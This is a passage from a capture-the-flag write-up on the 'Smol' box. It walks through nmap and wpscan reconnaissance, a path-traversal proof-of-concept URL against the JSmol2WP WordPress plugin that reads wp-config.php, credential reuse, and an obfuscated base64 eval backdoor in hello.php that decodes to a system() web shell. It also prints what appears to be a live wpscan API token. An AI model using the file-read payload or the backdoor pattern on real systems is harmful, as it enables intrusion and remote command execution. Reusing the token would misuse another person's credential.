# Write-up: **Smol**
Smol is a medium-ranked CTF box that introduces us to vulnerable Wordpress plugins, highlighting the need for website owners to keep dependencies up-to-date and to consider the source and reputation of installed plugins. The vulnerable web front-end then allows the execution of code on the web server, allowing to obtian a foothold on the system. Ultimately, root access is obtained through a combination of poorly managed passwords and misconfigurations.

## Reconaissance
The first step is to scan the host for open ports and find out about services that are offered. With `nmap`, we scan the 1000 most popular ports.
```
nmap -sV smol.thm
```
As the result shows us, two ports are open, offering the service SSH and a webpage.
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

When we try to visit the website, we get redirected to `www.smol.thm`, which is unknown to our domain server. Subsequently, we add the domain to our `/etc/hosts` file, allowing us to open the page.

![Initial view of webpage](img/Smol-InitialWebpage.png)

As we can see on the bottom of the page, the website is powered by the Wordpress framework. Therefore we should definitely run `wpscan` on the blog. Registering on WPScan's [official webpage](https://wpscan.com/) allows you to additionally make use of API tokens, which enables `wpscan` to access the WordPress Vulnerability Database, basically allowing your scan to automatically detect vulnerable plugins and themes. With the free-plan, you get 25 tokens per day.
```
wpscan --url www.smol.thm --api-token WEHKBQUrGbrJWLv7F7yWCJoZkARqtYlh1DDnsZ46n6E
```
Among others, we are able to identify the follwing vulnerability.
```
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
```
Following up the first link, we can see a proof of concept, allegedly allowing us to include files of the server into the rendered webpage.
```
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

## Establish a Foothold
Executing the actual PoC (of course after having exchanged domain and port) already yields an interesting finding, since we can find the credentials of the MySQL user that is being used by Wordpress.
```
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', -REDACTED- );
```
If the people that set up the server were cautious, they of course didn't reuse these credentials for an actual user of the Wordpress blog. But as Einstein indicated, we all do have not so bright moments, so it's definitely worth to check if we can login with the `wpuser` user. Since the login page is not visible on the home site, one can open the blog article about RCEs and try to comment under it, which redirects to the login. And in fact, we succesfully bypass the first line of security with the credentials that we have found.

We then proceed to the admin section of the blog by clicking on our profile picture on the top-right. There we can see that we do not have an administrator role, since for example we cannot see the user managament and plugins section. On the other hand, we do have some kind of editor rights, since we can maintain and therefore read a page that was written by the administrator, showing us a list of To-Dos.

![Internal wordpress page with webmaster's tasks](img/Smol-InternalPage.png)

Wait, hold up! The webmaster is talking about a backdoor in the "Hello Dolly" plugin? Wouldn't it be nice to inspect the content of this plugin, to see if a backdoor really does exist and how to make use of it... But since we're not administrators, we aren't able to manage the Wordpress plugins and read/modify their code. But we have already found a way for a LFI, we only need to know where plugins are located and how they are internally structured. Since Wordpress is a well-known and open-source framework, we can easily find out that plugins are located at `/wp-content/plugin/`. Digging a little deeper into "Hello Dolly", a minimalistic plugin for inserting little phrases into the webpage, we can also find out that the plugin is delivered as a single file, being named `hello.php`. Let's include this file, just as we did with `wp-config.php` in the reconaissance stage. In it, we find the following line of code in the function that is responsible of randomly selecting a phrase, i.e. that the function is run every time the plugin is invoked.
```
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```
So a line of PHP is being added by the `eval` statement, that is obfuscated by being encoded in base64. Let's decode the line.
```
echo CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA= | base64 -d
```
Which yields the following result.
> if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
So there is actually backdoor implemented into the site. Now we 
